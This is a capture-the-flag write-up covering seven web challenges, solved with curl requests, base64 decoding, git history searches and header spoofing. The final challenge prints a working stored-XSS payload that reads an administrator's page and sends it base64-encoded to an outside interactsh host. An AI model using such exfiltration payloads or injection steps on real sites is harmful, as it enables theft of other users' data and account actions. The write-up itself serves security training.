---
title: "Web Challenges x7 : CTF Cibersec 0x2024"
author: xpnt
date: 2024-06-13
image:
  path: https://raw.githubusercontent.com/xpnt0/xpnt0.github.io/master/assets/images/CTF-CiberSec-0x2024/web-challenges-xpnt.png
  height: 1500
  width: 500
categories: [CiberSec, "CTF 0x2024"]
tags: [XSS,Git,curl,SOP,Information_Disclosure]
---

# Challenges

## levantamoralnumberone - Easy
##### Description
Parece como si alguien hubiera hecho defacing a nuestro sitio. ¿Quizás todavía haya alguna forma de autenticarse?
##### Writeup
- Upon accessing the website, we encountered a message indicating that we haven't sent data via a POST request.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611213225.png)

- When reviewing the source code, we found an HTML comment containing, presumably, credentials for the user `admin`.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611213617.png)

- Due to the descriptive name of `/post.php` and the suggestive messages on the site, we will send these credentials via a POST request using `curl`. We will send `username` and `password` as POST parameters with their respective values.

```bash
curl -s -X POST http://165.227.106.113/post.php -d "password=71urlkufpsdnlkadsf&username=admin"
```

- Finally, I got the flag!

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611214032.png)

- Flag: `flag{p0st_d4t4_4ll_d4y}`


## queee?? noooo!! que mala eres 🤖 - Easy
##### Description
Podrás encontrar el mensaje oculto en este sitio? Apurate antes que se oxide
##### Writeup
- The emoji of a `robot` is a hint for us to check the `/robots.txt` file, which essentially contains instructions for bots (e.g., web crawlers) that tell them which webpages they can and cannot access
- Upon visiting `/robots.txt` we can find gibberish of digits and letters that appears to be a base64 encoded string. After decoding it, we obtain the flag!

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240609171652.png)

```bash
echo -n "ZmxhZ3tyMGIwdDFuX3AxcDFwMX0=" | base64 -d;echo
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611215311.png)

- Flag: `flag{r0b0t1n_p1p1p1}`

## Uatu - Easy
##### Description
- Se me cayó una flag en la pagina de inicio, podrás encontrarla?
##### Writeup
- Because it's a CTF and the description seems to indicate that the flag is on the homepage, I'll search for HTML comments using the `curl` command.

```bash
curl -s https://ctf.uni.edu.pe/ | grep -oP '<!--.*-->'
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611215933.png)

- Great! I found a comment that seems to contain a base64-encoded string. I decoded it and I got the flag.

```bash
curl -s https://ctf.uni.edu.pe/ | grep -oP '<!--.*-->'
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611221330.png)

- Flag: `flag{0j1t0_c0nt1g0}`


## sop or soup, what's the difference - Easy
##### Description

Ah, the SOP – it's like the secret sauce that makes websites shine! Add a dash of CORS, sprinkle in some CSP, and voilà! It's like crafting your own digital masterpiece at home. Who wouldn't want a soup loaded with images? Personally, I'm all in for that flavor-packed feast!

site: https://xpnt0.github.io
##### Writeup
- We know that SOP serves as a browser security measure, preventing websites from attacking each other, commonly used to thwart XSS, CSRF, and the like. However, the concept is essentially broader, aiming to prevent one page from accessing sensitive data on another web page. Nevertheless, there are exceptions to this rule. The SOP permits the embedding of images via the `<img>` tag, media via the `<video>` tag, and JavaScript includes using the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript, for instance, the use of `<canvas>` to read pixel data, won't be able to access the contents of these external resources.

- Since in the statement they emphasize the images loaded thanks to SOP. I will recover the links from which they are uploaded.

```bash
curl -s https://xpnt0.github.io | grep -oP '<img src="\K[^"]*'
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240601115320.png)

- The presence of the `hash mark` in the URL, it doesn't seem to allow scrolling to a specific section of a page. Instead, this appears to be a base64-encoded string. I will decode it . Great!! I got the flag.

```bash
echo 'Q1NVe3hwbnRfMTB2MzVfbTRydS1jaDRufQ==' | base64 -d;echo
# CSU{xpnt_10v35_m4ru-ch4n}
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240601120135.png)


## git101 - Easy

##### Description

GitHub repositories conceal secrets that should never be discovered. Can you find my secret? I'm sure I removed it.

Flag format: CSU{anything_here}
Site: https://xpnt0.github.io


##### Writeup
- I'll review the commits to check for accidentally exposed secrets.

```bash
git log --author='xpnt'  --pretty=format:"%h - %an, %ar : %s"
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240601123835.png)

- Since there are multiple commits, I created a bash script to grep for the secret (flag) in the changes made in each commit by the user `xpnt`.

```bash
git log --author='xpnt'  --pretty=format:"%h" | while read -r commith;do PAGER= git show $commith |grep CSU ;done

# CSU{so_34şy,r16ht?}
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240601124554.png)


## practicaste o no? - Medium

##### Description
Intenta eludir mis mecanismos de seguridad, cuidado con el waf XD!!!.
Site: [http://165.227.106.113/encabezado.php](http://165.227.106.113/encabezado.php)

##### Writeup
- When accessing `/encabezado.php`, I notice that the server responds with a `404 Not Found` code, presumably because the resource does not exist.

```bash
curl http://165.227.106.113/encabezado.php -I
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611222102.png)

- At this point, I tried different routes that could exist related to the CTF (I didn't perform any fuzzing) until finally the route `/header.php` returns a `200 OK` code.

```bash
curl http://165.227.106.113/header.php -I
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611223537.png)

- The server response on the `/header.php` route indicates that the `User-Agent` header is incorrect. Additionally, we see that there is an HTML comment with what appears to be a validation code.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611223849.png)

- It seems the server is filtering by the `User-Agent` header. I'll make a request with `curl` using the comment as the `User-Agent`, and we get a different response.

```bash
curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611224133.png)

- The response seems to indicate that the server validates that we come from the site `awesomesauce.com`. There are different ways for the server to accomplish this, one of them being checking the `Referer` header. Because of this, I tried this header with curl and I got the flag.

```bash
curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt -H 'Referer: awesomesouce.com'
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611224713.png)

- Flag: `flag{did_this_m3ss_with_y0ur_h34d}`

## Poemsss - Almost Hard

##### Description
Ya toca subir el lvl, crea tu cuenta y envía tu poema, los poemas seleccionados se llevarán la gift card. 

Site: [http://52.87.255.81:8083](http://52.87.255.81:8083/)
##### Writeup

- This challenge approaches a white-box perspective, unlike the other challenges. However, when I solved the challenge, I approached it from a black-box standpoint. Therefore, I will explain both methods and the mitigation of the vulnerability present in this application.


###### Comments

>Since the instance is no longer available, I'll set up the web application within a Docker container and work locally. Therefore, I'll modify the original zip file. The changes made aim to alter the URL of the driver in the `selenium` service and the functionality of `doVisit()`. You can download the new zip file here.
>![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612004104.png)
>Then, I'll simply run the `deploy-challenge.sh`, which will automatically deploy the Docker containers.
```bash
sudo bash deploy-challenge.sh
```
>![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611234614.png)
 {: .prompt-info }


###### Black-Box approach

- Upon accessing the website, I noticed it's a poetry competition. Since there aren't any interesting functionalities available from an unauthenticated standpoint, I'll create an account to explore potential new features.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611234928.png)

- To create an account, I need to fill in the following fields: `Username`, `About you`, and `Password`. These fields have certain backend verifications, but nothing particularly interesting at the moment.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611235303.png)


![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240611235630.png)

- Usually, the `/register` functionality allows for quick and easy enumeration of users, and this case is no exception. Thanks to this, we can confirm that the user `admin` exists.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612231250.png)

- After creating an account and logging into the website, I noticed a new functionality (`/poem/`) that allows me to write a poem, as expected. When I write and save a poem, it is displayed in my profile.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612001203.png)

- Since it's displayed on the profile, there are multiple vulnerabilities to test in these cases, but I always start with HTML injection (which usually leads to XSS). When attempting to inject HTML code, it seems to be interpreted correctly!

```html
<h1><b><u><strike>testing HTML Injection</strike></u></b></h1>
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612001649.png)

- But the most interesting part here is that I can submit this poem for review, presumably by the site administrators (user `admin`).

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612000029.png)


- This is a typical scenario to exploit an XSS. If the panel where the administrator reviews my poem does not properly sanitize or escape the input of my poem (as was the case with my profile), it's possible to insert JavaScript code to exploit an XSS. However, it's worth noting that the session cookie has `HttpOnly` activated (`true`), so performing a `Cookie Hijacking` is not possible in this scenario. Nonetheless, it does not necessarily lessen the severity of XSS vulnerabilities because the arbitrary JavaScript code allows us to perform the same actions as if we knew the administrator's session cookie. Let's try it!

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612002829.png)

- Here's the payload I'll send in my poem. This JavaScript code will make a request to the administrator's dashboard (`/poem/`) and return the HTML code encoded in base64 via a POST request to a domain under my control (in this case, I used the Open-Source Solution for OOB Testing, `interact.sh`). The purpose is to search for exclusive functionalities and personal information (section `About me`) of the user `admin`.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612232452.png)

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612232452.png)


```html
<script>
try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `http://172.20.0.1:8083/poem/`, false);
		xhr.send();
		var msg = xhr.responseText;
} catch (error) {
	var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("POST", "http://qsqrdohxfwvjszlwdlnupz5lv1q0nup86.oast.fun/exfil", false);
exfil.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
exfil.send('data=' + btoa(msg));
</script>
```

- At `app.interactsh.com`, we filter for HTTP requests.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612232834.png)

- As expected, we received 3 HTTP requests. The first is when we update our poem, and the second corresponds to when we send our poem to the user `admin`. This happens because after the described processes, there is a redirection to the site `/poem/`, causing the JavaScript code to be executed by our own browser. This can be easily observed using the `Burp Suite` proxy.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612233503.png)

- The third request we received is evidence that the JavaScript code is being executed by someone else's browser. I'll decode the base64-encoded string and review its content.

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612234316.png)

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612234336.png)

- After decoding the base64-encoded string, we can confirm that this request is made by the browser of the user `admin`, allowing us to exfiltrate their personal information and potentially discover new functionalities. With this done, I can see the flag in the `About me` field!

```bash
echo -n "<base64_here>" | base64 -d | sponge admin_dash.html
cat admin_dash.html
```

![](/assets/images/CTF-CiberSec-0x2024/Pasted image 20240612235118.png)

- Flag: `CSU{n1c3_xss_t3chn1qu3}`

###### WhiteBox approach and several types of Mitigation
 >I'll only show them at the welcome meeting, so I hope to see you 😁!!
 {: .prompt-info }

 >I hope you had as much fun reading this write up as I did writing it. Happy Hacking!!👾
 
{: .prompt-tip }